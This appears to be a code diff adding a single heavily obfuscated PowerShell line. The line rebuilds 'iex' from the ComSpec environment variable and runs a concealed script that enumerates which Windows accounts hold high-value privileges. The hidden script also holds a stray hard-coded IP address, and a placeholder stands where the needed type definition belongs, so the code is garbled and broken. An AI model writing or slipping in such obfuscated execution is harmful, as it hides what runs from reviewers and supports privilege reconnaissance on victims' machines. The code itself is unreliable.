@@ -1,0 +1,68 @@
+ . ( $Env:COmsPeC[4,15,25]-Join'')( ('function Get-LocalRight { 
+<# 
+*Privilege names are '+'**case-sensitive**.* Valid privileges are documented o'+'n MicrosoftXxTs website:  
+'+'[Privilege Constants]    (http://msdn.microsoft'+'.com/en-us/library/windows/desktop/'+'bb530716.aspx) 
+[Account Right Const'+'ants](http://'+'msdn.'+'microsoft.com/en-us/library/windows/deskto'+'p/bb545671.aspx) 
+#>'+' 
+ 
+[cmdletbinding()] 
+Param ( 
+    [validateset(XxTSeAssignPrimar'+'yTokenPrivilegeXxT,XxTSeAuditPrivilegeXxT,XxTSeBackupPrivilegeXxT,XxTSeBatchLogonRightXxT,'+' 
+    XxT'+'SeChangeNotifyPrivilegeXxT,XxTSeCreateGlobal'+'PrivilegeXxT,XxTSeCreatePagefile'+'PrivilegeXxT,XxTSeCreatePermanent'+'PrivilegeXxT, 
+    XxTSeCreateSymbolicLi'+'nkPrivilegeXxT,XxTSeCreateTokenPrivilegeXxT,XxTSeDebu'+'gPrivilegeXxT,XxTSe'+'DenyBatc'+'hLogonRightXxT, 
+    X'+'xTSeDenyInteractiveLogon'+'RightX'+'xT,XxTSeDenyNetworkLogonRightX'+'xT,XxTSeDenyRemo'+'teIntera'+'ctiveLogonRightXxT, 
+    XxTSeDenyServiceLogonRightXxT,XxTSeEnableDelega'+'tionPrivilegeXxT,XxTSeImperso'+'natePrivilege'+'XxT, 
+    XxTSeIncreaseBasePri'+'orityPrivilegeXxT,XxTSeIncr'+'easeQuotaPrivilegeXxT,XxTSeI'+'ncreaseWorkingSetPrivilegeXxT,'+' 
+    XxTSeI'+'nteractiveLogonRightXxT,XxTSeLo'+'adDriverPrivilegeXxT,XxTSeLockMemoryPrivilegeXxT,XxTSeMachineAccountPrivilegeXxT, 
+    XxTSeManageVo'+'lumePrivilegeXxT,XxTSeNetworkLo'+'gonRightXxT,Xx'+'TSeProfileSingle'+'ProcessPrivilegeXxT,XxTSeRelab'+'elPrivilegeXxT, 
+    XxTSeRemo'+'teInteractiveLogonRightXxT,XxTSeRemoteShutdownPrivilegeXxT,XxTSeRestorePrivilegeXxT,'+'XxTSeSecurityPrivilegeXxT, 
+    XxTSeServiceLogonRightXxT,XxTSeS'+'hutdownPrivilegeXxT,XxTSeSyncAgen'+'tPrivilegeXxT,XxTSeSystemEnvironmentPrivilegeXxT, 
+ '+'   XxTSeSystemProfilePrivilegeXxT,XxTSeSystem'+'timePrivilegeXxT,XxTSeTakeOwnershipPri'+'vilegeXxT,XxTSeTcbPrivilegeXxT, 
+    XxTSeTimeZonePrivilegeXxT,XxTSeTrustedCredManAccessPrivilegeXxT,XxTSeUndockPrivilegeXxT,'+'XxTSeUnsolicited'+'InputPrivilege'+'XxT)] 
+ 
+    [S'+'tring[]]HqlSecurityRight = (XxTSeTcbPrivilegeXxT,XxTSeInteractiveLogonRightXxT,XxTSeRemoteInteractiveLo'+'gonRightXxT,XxTSeBacku'+'pPrivilegeXxT, '+'
+                                XxTSeSystemtimePrivile'+'geXxT,XxTSeCreateTokenPrivilegeXxT,XxTSeDebugPriv'+'ilegeXxT, '+'
+            '+'                    XxTSeEnableDelegationPrivilegeXxT,Xx'+'TSeLoadDriverPr'+'ivilegeXxT,XxTSeBat'+'chLogonRightXxT'+', 
+                               '+' XxTSeServiceLogonRightXxT,XxTSeSec'+'urityPrivilegeXxT,XxTSeSystemEnvironmentPrivilegeXxT, 
+                          '+'      XxTSeManageVolumePrivilegeXxT,XxTSeRestorePrivilege'+'XxT,XxTSeSyncAgentPrivilegeXxT,XxTSeRelabelPrivilegeXx'+'T, 
+                  '+'              XxTSeTakeOw'+'nershipPrivilegeXxT) 
+)'+' 
+    (  XxT'+'ip:122.15.201.53X'+'xT  )g'+'Nq  write-host
+ 
+Hqlc ='+' @XxT 
+// download for definition 
+XxT@ '+'
+ 
+    try { 
+        Hqlt = [LsaSe'+'cu'+'rity'+'.LsaWrapper] 
+    } 
+    cat'+'ch { 
+'+'       Hq'+'lt ='+' Add-Type -TypeDefin'+'ition Hqlc  
+    } 
+ 
+    Hqld = New-Object -TypeName '+'LsaSecurity.LsaW'+'rapper 
+    '+' 
+     
+    HqlSecurityRight gNq Foreach-Object { 
+        HqlRight = Hql_ 
+        try { 
+            Hqld.ReadPrivilege(HqlRight) gNq ForEach-Object { 
+       '+'          
+    '+'            HqlCurrent = Hql_.Translate([System.Security.Principal.NTA'+'ccount]) 
+ 
+                New-Object -TypeName psobject -'+'Property @{ 
+ '+'             '+'      Security'+'Right= HqlRight 
+                    Identity     = HqlCurrent.'+'value'+' 
+       '+' '+'        } 
+ '+'           }#Foreach-Object(NTAccount) 
+        '+'}#T'+'ry 
+        Catch { 
+            Write-Warning -Message fLrNo Identites'+' with HqlRightfLr 
+        }#Catch 
+ 
+ 
+    }'+'#Foreach-Object(Secu'+'rityRight) 
+ 
+}
+
+').REplaCe(([chAr]102+[chAr]76+[chAr]114),[strIng][chAr]34).REplaCe(([chAr]72+[chAr]113+[chAr]108),[strIng][chAr]36).REplaCe(([chAr]103+[chAr]78+[chAr]113),[strIng][chAr]124).REplaCe('XxT',[strIng][chAr]39) ) 
